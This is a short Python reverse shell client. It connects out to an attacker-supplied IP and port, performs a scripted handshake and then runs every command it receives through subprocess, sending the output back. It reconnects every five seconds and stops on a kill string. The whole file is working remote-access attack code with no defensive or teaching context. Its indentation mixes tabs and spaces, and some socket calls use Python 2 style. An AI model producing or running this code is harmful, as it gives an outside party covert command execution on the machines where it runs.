import socket, subprocess,sys
import time as t
def shell():
    while True:
	command_to_exe = s.recv(99999)
        if "SC-SHTDWN-XT" in str(command_to_exe):
            sys.exit(0)
        proc = subprocess.Popen(command_to_exe, stdout=subprocess.PIPE)
        result = proc.stdout.read()
        s.send(str(result))
try:
    ip_addr = str(sys.argv[1])
    port_number = int(sys.argv[2])
except:
    print("USAGE: "+sys.argv[0]+" [server IP or Hostname] [port number]")
    sys.exit(1)
s = socket.socket()
while True:
    try:
        handshake="CLIENT TO SERVER."
        s.connect((ip_addr, port_number))
        s.send(handshake)
        handret=s.recv(64)
        if "OK. SERVER TO CLIENT." in str(handret):
            s.send("OK. CONNECTION GO.")
            handret2=s.recv(64)
            if "REVERSE SHELL LISTENING." in str(handret2):
                shell()
            else:
                print("Bad handshake 2")
        else:
            print("Bad handshake 1")
           # sys.exit(0)
    except (socket.error, socket.timeout):
        #print("Socket Error")
        t.sleep(5)
        continue


